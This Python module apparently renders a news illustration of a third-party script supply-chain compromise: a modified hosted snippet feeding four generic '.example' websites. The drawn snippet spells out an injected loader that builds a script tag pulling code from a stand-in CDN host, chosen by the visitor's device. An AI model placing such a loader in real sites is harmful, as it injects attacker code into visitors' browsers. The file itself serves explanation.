"""Third-party script supply chain: many websites include the same hosted
script, so a change to that one file reaches all of them at once. The
subject is the one-to-many mechanism: the tampered file on top, the sites
that load it below, each pulling the same injected loader.

Generic sites with `.example` domains; a vendor named in the headline may
appear only as a plain-text caption."""
from __future__ import annotations

import random
from typing import Sequence

from ..brief import EditorialBrief
from ..kit import Box, Doc, Run, arrow, background, code, icon, pill, vignette, window
from . import scene


def _site(doc: Doc, b: Box, kind: int, url: str) -> None:
    """A recognisable but generic page layout inside a browser window."""
    p = doc.pal
    body = window(doc, b, url=url, lock=True, surface="#F4F6FA", chrome="#DDE3EC", depth=0.8,
                  url_color="#1B2433")
    ink, soft, mid = "#1B2433", "#D3DAE5", "#AEB8C8"
    x, y, w = body.x + 18, body.y + 16, body.w - 36
    strip = 36
    with doc.g(clip=doc.clip_rect(body.x, body.y, body.w, body.h - strip)):
        _layout(doc, kind, x, y, w, ink, soft, mid)
    # the page source: the include that every one of these sites carries
    sy = body.b - strip
    doc.add(f'<path d="M{body.x:.1f} {sy:.1f}H{body.r:.1f}V{body.b - 14:.1f}Q{body.r:.1f} {body.b:.1f} '
            f'{body.r - 14:.1f} {body.b:.1f}H{body.x + 14:.1f}Q{body.x:.1f} {body.b:.1f} {body.x:.1f} '
            f'{body.b - 14:.1f}Z" fill="#2A1216"/>')
    doc.text("<script src=\".../snippet.js\">", body.x + 16, sy + 24, 14, "#FF9C94", "mono")
    doc.circle(body.r - 20, sy + strip / 2, 5, p.danger)


def _layout(doc: Doc, kind: int, x: float, y: float, w: float, ink: str, soft: str, mid: str) -> None:
    if kind == 0:      # news front page
        doc.rect(x, y, w, 26, ink, 3)
        doc.rect(x + 10, y + 8, 90, 10, "#FFFFFF", 2)
        doc.rect(x, y + 40, w * 0.58, 104, mid, 4)
        for i in range(4):
            doc.rect(x + w * 0.62, y + 42 + i * 26, w * 0.38 - (i % 2) * 30, 10, soft, 3)
        for i in range(2):
            doc.rect(x, y + 156 + i * 18, w * (0.9 - i * 0.3), 9, soft, 3)
    elif kind == 1:    # video-meeting product page
        doc.rect(x, y + 6, w * 0.5, 16, ink, 3)
        doc.rect(x, y + 32, w * 0.42, 10, soft, 3)
        doc.rect(x, y + 54, 96, 30, "#2F6BFF", 6)
        for i in range(4):
            tx, ty = x + w * 0.52 + (i % 2) * (w * 0.24), y + 6 + (i // 2) * 70
            doc.rect(tx, ty, w * 0.22, 62, ["#5A6B86", "#7A8BA6", "#8796AE", "#65758F"][i], 6)
            doc.circle(tx + w * 0.11, ty + 26, 11, "#E8EDF5", opacity=0.75)
        doc.rect(x, y + 156, w, 9, soft, 3)
        doc.rect(x, y + 174, w * 0.6, 9, soft, 3)
    elif kind == 2:    # business SaaS sign-up page
        doc.rect(x + w * 0.15, y + 8, w * 0.7, 16, ink, 3)
        doc.rect(x + w * 0.25, y + 34, w * 0.5, 10, soft, 3)
        card = Box(x + w * 0.2, y + 62, w * 0.6, 112)
        doc.rect(card.x, card.y, card.w, card.h, "#FFFFFF", 8, stroke=soft, sw=1.2)
        for i in range(2):
            doc.rect(card.x + 14, card.y + 14 + i * 30, card.w - 28, 22, "#EEF2F7", 4, stroke=soft)
        doc.rect(card.x + 14, card.y + 76, card.w - 28, 24, "#0F9D74", 5)
    else:              # developer platform repository page
        doc.rect(x, y + 4, w * 0.45, 14, ink, 3)
        doc.rect(x + w - 80, y, 80, 24, "#E4E9F0", 5, stroke=soft)
        for i in range(6):
            doc.rect(x, y + 36 + i * 24, w, 22, "#FFFFFF" if i % 2 else "#EEF2F7", 2)
            icon(doc, "file", x + 12, y + 47 + i * 24, 13, "#8796AE", 1.4)
            doc.rect(x + 26, y + 43 + i * 24, 70 + (i * 37) % 60, 8, mid, 2)


@scene("third_party_script")
def third_party_script(doc: Doc, brief: EditorialBrief, rng: random.Random) -> None:
    p = doc.pal
    background(doc, light=(0.5, 0.05))
    kw, tx, st, cm = "#9CC4FF", "#C9D3E3", "#A5E3B8", "#5F6D86"
    text = brief.text or ""
    vendor = next((e for e in brief.entities
                   if any(k.format(e.lower()) in text for k in ("{} supply chain", "attack on {}", "{} script",
                                                                "targeting {}", "{} snippet"))), "")

    # ---- the shared script (hero, top centre)
    sw_ = Box(330, 64, 940, 382)
    doc.glow(sw_.cx, sw_.b - 40, 440, 90, p.danger, 0.16)
    body = window(doc, sw_, url="cdn.tag-vendor.example/js/snippet.js", lock=True, surface="#0E1524",
                  chrome="#172036")
    lines: list[Sequence[Run] | str] = [
        [("/* experiment snippet v2 */", cm)],
        [("!function", kw), ("(w,d){var c=w.__cfg||{};c.exp=[", tx), ("\"hero_b\"", st), (",", tx),
         ("\"cta_red\"", st), ("];", tx)],
        [("d.documentElement.dataset.v=c.exp.join(", tx), ("\",\"", st), (")}(window,document);", tx)],
        [(";(", tx), ("function", kw), ("(){", tx), ("var", kw), (" u=navigator.userAgent,", tx)],
        [("  s=document.createElement(", tx), ("\"script\"", st), (");", tx)],
        [("  s.src=", tx), ("\"https://static-cdn.example/\"", st), ("+(/iPhone/.test(u)?", tx), ("\"i\"", st),
         (":", tx), ("\"w\"", st), (");", tx)],
        [("  document.head.appendChild(s)})();", tx)],
    ]
    top = body.y + 50
    code(doc, body.x + 76, top, lines, size=18, lh=1.72, width=820, marks={i: p.danger for i in (3, 4, 5, 6)})
    pill(doc, body.r - 24, body.y + 14, "modified", fg="#FFFFFF", bg=p.danger, size=14, font="ui_bold",
         anchor="end")
    cap = f"{vendor} snippet: one file, loaded by every site below" if vendor else \
        "one hosted script, loaded by every site below"
    doc.text(cap, body.x + 24, body.b - 22, 16, p.muted, "ui")

    # ---- the sites that include it
    sites = [Box(40 + i * 382, 548, 354, 254) for i in range(4)]
    urls = ["news-daily.example", "meet-video.example", "crm-cloud.example", "code-hub.example"]
    for i, (b, u) in enumerate(zip(sites, urls)):
        _site(doc, b, i, u)

    # ---- distribution: one source, a bus, every site
    sx, sy = sw_.cx, sw_.b + 8
    bus_y = 496
    doc.path(f"M{sx:.1f} {sy:.1f}V{bus_y:.1f}", stroke=p.danger, sw=5)
    doc.path(f"M{sites[0].cx:.1f} {bus_y:.1f}H{sites[-1].cx:.1f}", stroke=p.danger, sw=4)
    for b in sites:
        arrow(doc, [(b.cx, bus_y), (b.cx, b.y - 8)], p.danger, sw=4, head=16)
    doc.circle(sx, bus_y, 8, p.danger)

    vignette(doc, 0.4)
    doc.focus = Box(240, 60, 1120, 630)
